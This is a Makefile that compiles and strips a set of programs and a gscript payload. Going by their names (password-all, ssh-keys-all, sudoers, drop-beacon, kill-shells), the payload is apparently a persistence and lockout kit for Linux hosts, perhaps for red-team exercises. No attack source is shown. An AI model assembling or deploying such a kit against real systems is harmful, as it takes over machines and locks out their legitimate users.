all:
	gcc -static-libgcc -o chsh-all chsh-all.c
	gcc -static-libgcc -o crontabs-all crontabs-all.c
	gcc -static-libgcc -o password-all password-all.c
	gcc -static-libgcc -o ssh-keys-all ssh-keys-all.c
	gcc -static-libgcc -o kill-shells kill-shells.c
	gcc -static-libgcc -o simplebeacon simplebeacon.c
	strip chsh-all crontabs-all password-all ssh-keys-all simplebeacon kill-shells

	gscript compile -o /tmp/payload-linux64 password-all.gs chsh-all.gs crontabs-all.gs ssh-keys-all.gs sudoers.gs elfstomp.gs drop-beacon.gs kill-shells.gs
	mv /tmp/payload-linux64 .
	strip payload-linux64

clean:
	rm -f simplebeacon kill-shells payload-linux64 payload-linux64-upx crontabs-all chsh-all password-all ssh-keys-all *.o *~

